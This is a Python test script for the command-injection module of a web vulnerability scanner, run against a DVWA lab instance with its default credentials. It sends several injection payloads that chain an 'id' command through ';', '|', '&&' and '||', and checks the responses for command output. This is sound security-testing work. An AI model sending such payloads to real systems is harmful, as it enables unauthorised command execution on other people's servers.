"""测试 CMDi 模块"""
import asyncio
import sys
import re
sys.stdout.reconfigure(encoding='utf-8')

import httpx
from wvs.core.session import HTTPPool
from wvs.config import ConfigManager
from wvs.models import ScanTarget
from wvs.modules.cmdi.detector import CMDInjectionDetector

DVWA = "http://192.168.18.131/dvwa"

async def main():
    print("=" * 60)
    print("CMDi 模块测试")
    print("=" * 60)
    
    # 登录并设置 security
    async with httpx.AsyncClient(timeout=10, follow_redirects=True, verify=False) as c:
        await c.get(f"{DVWA}/login.php")
        await c.post(f"{DVWA}/login.php", data={"username": "admin", "password": "password", "Login": "Login"})
        r = await c.get(f"{DVWA}/security.php")
        m = re.search(r"user_token'\s*value\s*=\s*'([^']+)'", r.text)
        token = m.group(1) if m else ""
        await c.post(f"{DVWA}/security.php", data={"security": "low", "seclev_submit": "Submit", "user_token": token})
        cookies = dict(c.cookies)
        print(f"[OK] DVWA ready")
    
    # 测试手动 payload
    print("\n[1] 手动测试 CMDi...")
    async with httpx.AsyncClient(timeout=10, follow_redirects=True, verify=False, cookies=cookies) as c:
        payloads = [
            ("127.0.0.1", "Normal"),
            ("127.0.0.1; id", "Semicolon"),
            ("127.0.0.1 | id", "Pipe"),
            ("127.0.0.1 && id", "AND"),
            ("127.0.0.1 || id", "OR"),
        ]
        
        for payload, desc in payloads:
            r = await c.get(f"{DVWA}/vulnerabilities/exec/", params={"ip": payload, "Submit": "Submit"})
            
            # 检查命令执行结果
            indicators = ["uid=", "gid=", "root", "groups="]
            found = [i for i in indicators if i in r.text]
            
            print(f"  {desc}: {payload}")
            if found:
                print(f"    [!] 命令执行成功: {found}")
                # 提取输出
                match = re.search(r'uid=\d+\([^)]+\)', r.text)
                if match:
                    print(f"    输出: {match.group()}")
            else:
                print(f"    未检测到")
    
    # 测试 CMDi 模块
    print("\n[2] 测试 CMDi 模块...")
    config = ConfigManager()
    session = HTTPPool(config)
    for name, value in cookies.items():
        session.set_cookie(DVWA, name, value)
    
    detector = CMDInjectionDetector(config=config, session=session)
    target = ScanTarget(url=f"{DVWA}/vulnerabilities/exec/", params={"ip": "127.0.0.1", "Submit": "Submit"})
    
    try:
        vulns = await asyncio.wait_for(detector.scan(target), timeout=60)
        print(f"  发现 {len(vulns)} 个漏洞")
        for v in vulns:
            print(f"    - {v.type.value} [{v.parameter}] {v.payload[:40]}")
    except asyncio.TimeoutError:
        print("  [ERROR] 超时")
    except Exception as e:
        print(f"  [ERROR] {e}")
        import traceback
        traceback.print_exc()
    
    await session.close()
    print("\n[OK] 测试完成")

if __name__ == "__main__":
    asyncio.run(main())
